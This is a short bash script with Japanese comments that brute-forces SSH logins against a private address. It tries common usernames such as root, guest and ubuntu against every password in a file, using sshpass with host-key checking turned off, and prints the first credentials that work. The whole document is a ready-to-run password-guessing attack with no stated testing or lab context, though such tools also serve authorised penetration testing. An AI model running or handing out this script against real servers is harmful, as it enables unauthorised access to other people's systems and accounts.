#!/bin/bash

# 標的のSSHサーバーとポート番号を定義する
TARGET="172.16.10.13"
PORT="22"

# ユーザー名とパスワードのリストを定義する
USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
PASSWORD_FILE="passwords.txt"

echo "Starting SSH credential testing..."

# 各ユーザー名とパスワードの組み合わせを繰り返し処理する
for user in "${USERNAMES[@]}"; do
  while IFS= read -r pass; do
    echo "Testing credentials: ${user} / ${pass}"

    # ログイン成功を確認するために終了コードをチェックする
    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
               -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
      echo "Successful login with credentials:"
      echo "Host: ${TARGET}"
      echo "Username: ${user}"
      echo "Password: ${pass}"

      # 認証情報によるログインに成功した場合の出力
      exit 0
    fi
  done < "${PASSWORD_FILE}"
done

echo "No valid credentials found."
